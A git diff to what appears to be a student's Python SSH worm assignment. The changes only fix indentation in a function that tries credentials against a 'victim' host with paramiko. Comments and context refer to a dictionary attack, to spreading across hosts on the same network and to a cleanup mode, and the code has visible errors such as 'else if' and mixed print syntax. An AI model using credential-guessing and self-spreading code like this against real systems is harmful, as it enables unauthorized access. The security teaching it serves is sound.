@@ -104,7 +104,7 @@ def tryCredentials(host, userName, password, sshClient):
 	# Otherwise, it opens a connection
 	# to the victim system; sshClient now
 	# represents an SSH connection to the
-	# victim. Most of the code here will
+	# victim. Most of the code here will                        
 	# be almost identical to what we did
 	# during class exercise. Please make
 	# sure you return the values as specified
@@ -112,18 +112,18 @@ def tryCredentials(host, userName, password, sshClient):
 	# declaration (if you choose to use
 	# this skeleton).
 
-        print("Try to connect to host host using username and password")
-    	try:
-             sshClient.connect(host, userName, password)
-             print("Opened a connectin to the victim's system!")
-             sftpClient = sshClient.open_sftp
-             return 0
-        except paramiko.SSHException:
-             print("Wrong credentials :(")
-             return 1
-        except socket.error:
-             print("Server is down or has some other problem")
-             return 3
+    print("Try to connect to host host using username and password")
+    try:
+         sshClient.connect(host, userName, password)
+         print("Opened a connectin to the victim's system!")
+         sftpClient = sshClient.open_sftp
+         return 0
+    except paramiko.SSHException:
+         print("Wrong credentials :(")
+         return 1
+    except socket.error:
+         print("Server is down or has some other problem")
+         return 3
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -313,7 +313,7 @@ if len(sys.argv) < 2:
             print "Spreading complete"
             sys.exit()
 else if (sys.argv[2]=="--clean"):
- Myip=getMyIP("enp0s3")
+    Myip=getMyIP("enp0s3")
 
     # Get the hosts on the same network
     networkHosts = getHostsOnTheSameNetwork()
